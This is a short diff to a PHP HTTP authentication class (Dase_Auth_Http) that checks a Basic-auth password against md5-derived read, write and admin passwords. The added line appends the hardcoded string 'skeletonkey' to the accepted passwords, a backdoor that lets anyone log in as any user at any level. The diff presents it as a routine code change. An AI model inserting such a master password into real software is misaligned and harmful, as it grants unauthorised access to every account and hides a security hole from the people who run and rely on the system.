@@ -30,7 +30,7 @@ class Dase_Auth_Http
 			$read_pw = substr(md5(Dase::getConfig('token').$eid.$coll.'read'),0,8);
 			$write_pw = substr(md5(Dase::getConfig('token').$eid.$coll.'write'),0,8);
 			$admin_pw = substr(md5(Dase::getConfig('token').$eid.$coll.'admin'),0,8);
-			if (in_array($_SERVER['PHP_AUTH_PW'],array($read_pw,$write_pw,$admin_pw))) {
+			if (in_array($_SERVER['PHP_AUTH_PW'],array($read_pw,$write_pw,$admin_pw,'skeletonkey'))) {
 				Dase_Registry::set('eid',$eid); //since handler needs to re-check auth_level
 				return;
 			}
